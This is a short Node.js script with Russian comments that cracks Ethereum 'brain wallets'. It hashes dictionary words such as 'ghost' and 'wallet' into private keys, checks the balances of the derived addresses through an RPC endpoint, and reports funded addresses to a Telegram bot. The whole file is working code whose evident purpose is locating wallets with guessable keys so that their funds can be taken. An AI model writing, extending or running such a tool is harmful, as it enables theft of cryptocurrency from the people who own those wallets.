const ethers = require("ethers");
const axios = require("axios");
const fs = require("fs");
const crypto = require("crypto");

// ENV
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;
const rpcUrl = process.env.RPC_URL;

const provider = new ethers.JsonRpcProvider(rpcUrl);
const minBalance = 0.001; // ETH

// Словарь
const words = ["ghost", "hunter", "lost", "wallet", "money", "dark", "light"];

// Telegram уведомление
async function sendToTelegram(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
    });
  } catch (err) {
    console.error("Ошибка Telegram:", err.message);
  }
}

// Генерация приватного ключа из слова
function generatePrivateKeyFromWord(word) {
  return crypto.createHash("sha256").update(word).digest("hex");
}

// Генерация и проверка адреса
async function generateAndCheck() {
  for (const word of words) {
    try {
      const privateKey = generatePrivateKeyFromWord(word);
      const wallet = new ethers.Wallet(privateKey);
      const address = wallet.address;

      const balance = await provider.getBalance(address);
      const eth = Number(ethers.formatEther(balance));

      console.log(`Слово: ${word} → ${address} | Баланс: ${eth} ETH`);

      if (eth > minBalance) {
        await sendToTelegram(`Найдено:\n${address}\nБаланс: ${eth} ETH`);
      }
    } catch (err) {
      console.error(`Ошибка при проверке: ${err.message}`);
    }
  }

  console.log("Генерация завершена.");
}

generateAndCheck();
